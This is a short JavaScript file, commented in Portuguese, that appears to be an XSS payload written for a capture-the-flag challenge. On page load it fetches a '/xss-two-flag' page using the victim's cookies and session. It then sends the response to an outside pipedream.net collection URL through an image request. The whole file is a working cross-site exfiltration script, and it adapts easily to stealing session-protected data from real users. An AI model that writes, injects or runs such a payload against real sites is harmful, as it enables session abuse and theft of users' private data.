document.addEventListener('DOMContentLoaded', () => {
    // Supõe que a flag esteja acessível pela URL /xss-two-flag
    fetch('/xss-two-flag', {
        credentials: 'include' // Assegura que cookies e sessões sejam enviados com a requisição
    })
    .then(response => response.text()) // Converte a resposta para texto
    .then(flag => {
        // Envio da flag para o servidor externo
        const url = 'https://eom6hzyuukgbktj.m.pipedream.net/';
        const params = new URLSearchParams({ flag: flag });

        // Cria uma imagem para enviar a requisição GET
        var img = new Image();
        img.src = `${url}?${params.toString()}`;
        document.body.appendChild(img); // Adiciona a imagem ao corpo do documento para disparar a requisição
    })
    .catch(error => console.error('Error fetching the flag:', error));
});
